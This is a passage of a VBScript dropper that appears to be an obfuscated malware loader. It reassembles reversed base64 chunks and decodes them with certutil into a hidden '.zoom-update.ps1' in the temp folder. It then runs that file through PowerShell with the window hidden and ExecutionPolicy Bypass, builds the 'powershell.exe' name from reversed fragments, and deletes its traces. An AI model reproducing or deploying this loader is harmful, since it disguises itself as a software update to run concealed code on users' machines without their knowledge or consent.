    "rZ2MiJVdptkcjd2ZYN3d14kVFhHW3AjbBtyT5UWbW5Wc6JHc", _
    "BFGehNlN4M2bkNEMWZncwVTTtxEcX9CUSBHU2glWrEkSjh2R", _
    "xEGZnJjWwE1SxB3aqZEMvNEV0EXV3Zmb44UVZZHOYJzNxMnQ", _
    "XZWdNpmcZZEbrhEMjZjTRpHNWxEVrBTO2ETMSZVcOdUdxcza", _
    "OVTOTBjMzEjQEhWR2NmY4AXboR2YTJnUBpmdNFXT4FEanVlM", _
    "sN0S6N2VG5Gdmp0bHJjUXBTeIZ2LlZzUrpkZuJnUrMTRxYnS", _
    "Q9SWXRlcGFHazIkNYVjSth2akFzdwc1dxFDNwkEdlVWOwwmQ", _
    "gQ3YlpmYP1ydl5EI9ASbhVmc0NlenRCIgACIK0QKn0TR3ZWM", _
    "pp3ZkACIgAiCNkyclRXeCp3ZkwCKtFWZyR3U5J3btVWTu8US", _
    "0FGbmVGRu42bpN3clJHct92Qu8USgQ3YlpmYP1ydl5EI9ACc", _
    "D5ibvl2czVmcw12bD5yTJtFIs0WYlJHdTp3ZkgSbhVmc0NVZ", _
    "yRCIgACIK0QKzNXZyBXbvNWZEpjOdVGZv1kbvl2czVmcw12b", _
    "kgiclRWYlJVbhVmc0NlLPlEI0NWZqJ2TtcXZOBSPgIXZkFWZ", _
    "zRCIgACIK0QK4YEVVpjOddmbpR2bj5WRuQHelR1WgwCcpp3Z", _
    "lJHJgACIgoQDpgCZuV0bURWYlJlLyVGZhVmckASPgU2YyV3b", _
    "6dGJgsTKoU2cvB3cpRkLwlmenRCI7kCKlN3bwNXaE5iclRWY", _
    "lpmYP1ydl5EI9ACcjRCIgACIK0QKoU2cvB3cpRkLtFWZyR3U", _
    "QJXZslGct92QuIXZslGct92Qu02bEVGZvNkLtVGdzl3UgQ3Y", _
    "gkncv1WZN5WSlRXYyVmbldkLwNGJgACIgoQDzJXZ0VWbhJXY", _
    "gUGbiFGd1NWZ4VUZ0Fmcl5WZH5CcjRCIgACIK0QZ1JHdkASP", _
    "g0DIz52bpRHcPJXZslGct92QuA3YkACIgAiCNU2csFmZkASP", _
    "5N1JscCbsRmLtVGdzl3UngCQgACIgoQDnsSZ6lWbpRHcv9yJ", _
    "nwGbk5Se0lmc1NWZT5SblR3c5N1JscCbsRmLlJ3bD5SblR3c", _
    "P1CajFWRy9mRgwHIpcCbsRmLwJXYoN1QuQnZvN3byNWaNdCL", _
    "lNmblJXZmVmUuA3Yk0FZp9mdbBCIgACIgACIK0wegQ3YlpmY", _
    "vJHckACIgAiCN0HIgACIK0QKfRCKkRWQuMXZpxmYtV2czFEZ", _
    "uAnchh2UD5Cdm92cvJ3Yp1EI0NWZqJ2TtcXZOBSPgIXZklmd", _
    "wRCI9ACdsV3clJHJgACIgoQDyVGZpZ3byBVZk92QwJXYoN1Q", _
    "jRCKlNmc192Ut9mcGlHbi1WZzNXQlxWaw12bD5iclRWa29mc", _
    "uMncvJncF5CdsV3clJHJoAiZpBCIgAiCNkSZjJXdvNHJgwCc", _
    "K0wJnASPgQHelRHJgACIgACIgAiCNsHIpADI0dWLgQnb192Q", _
    "y9mcyVkL0xWdzVmckAibpBSZkgCIoNWYlJ3bmBCIgACIgACI", _
    "i4GYyBmIgsCIpgyZulmc0N1bU5SZkASPrACd4VGdkAyegkyc", _
    "oQHelRFbsFUZ0lmcXpjOdVGbpZkLPl0WgACIgACIgAiCN0HI", _
    "sVGazJXZ39Gct02bvp3JgAVTFRlO25WZkACa0FGUt4WavpEK", _
    "gACIK0gMgQXa4VGIgACIgACIgoQDpQHelRHJgwSKnc2bs5Cb", _
    "lN3cBRWZslGct92QuQHb1NXZyRCI9ASZwlHdkACIgAiCN0HI", _
    "0VWbkACIgAiCNkyJyVGZh9GTt92badCKlBXeURXZH5SesJWb", _
    "kACIgAiCNkyJulWYNdCKk9Ga0VWT0V2RuUGc5RHJg0DIk9Ga", _
    "pJHdztFKgYWagACIgoQDFR0TN9VTP9kW6YnblRCI9ASZk9Wb", _
    "9ASZk9WbkAyegkSKlR2btRCK5RHctVkcPxGb150cJpjOddmb", _
    "tcXZOBSPgM3ZyFUZr9mdulGJgACIgoQD9ByJsxWY0NnbpdCI", _
    "zdmcBV2avZnbpRCIgACIK0QMgcSXbR3YlpmYvdCI0NWZqJ2T", _
    "gUGZvNGJgACIgoQDpUGZv1GJoAUXdt1Zulmc0N3Wg0DIdBzW", _
    "pM3ZyFUZr9mdulGJgwCbsVnbkgSZr9mdulkLk9Ga0VWbkASP", _
    "gAiCNsHIoNGdhNGI9pQDlR2bjRSX05WabBCdphXZgACIgoQD", _
    "sxWQlRXaydlO60VZslmRu8USbBCIgACIgACIK0wegknc0BCI", _
    "ld3bw1Sbv9menACUNVEV6YnblRCIoRXYQ1ibp9mSogCd4VGV", _
    "g0HIgACIK0QKpgyZulmc0N1bU5yXkACLpcyZvxmLsxWZoNnc", _
    "=0nCNEDI0lGelBCIgAiCN03egg2Y0F2Y" _
)

b64 = ""
For i = 0 To UBound(chunks)
    b64 = b64 & Rev(chunks(i))
Next

' powershell.exe assembled from reversed fragments.
psExe = U(Array("llehsrewop", ".", "exe"))
psFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\.zoom-update.ps1"
b64File = sh.ExpandEnvironmentStrings("%TEMP%") & "\.zoom-update.b64"
Set st = CreateObject("ADODB.Stream")
st.Type = 2
st.Charset = "ascii"
st.Open
st.WriteText b64
st.SaveToFile b64File, 2
st.Close
Set st = Nothing
sh.Run "certutil.exe -f -decode """ & b64File & """ """ & psFile & """", 0, True
fso.DeleteFile b64File, True
psCmd = psExe & " -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & psFile & """"

On Error Resume Next
waitMode = (mode = "selftest")
rc = sh.Run(psCmd, 0, waitMode)
If Err.Number <> 0 Then
    rc = 1
    Err.Clear
End If

If mode = "selftest" Then
    logPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\zoom-selftest.log"
    If fso.FileExists(logPath) Then
        WScript.Echo fso.OpenTextFile(logPath, 1).ReadAll
    End If
    WScript.Echo "dropper_exit=" & rc
End If

Function Rev(value)
    Rev = StrReverse(value)
End Function

Function U(parts)
    Dim j
    U = ""
    For j = 0 To UBound(parts)
        U = U & StrReverse(parts(j))
    Next
End Function

Function IIf(condition, whenTrue, whenFalse)
    If condition Then
        IIf = whenTrue
    Else
        IIf = whenFalse
    End If
End Function
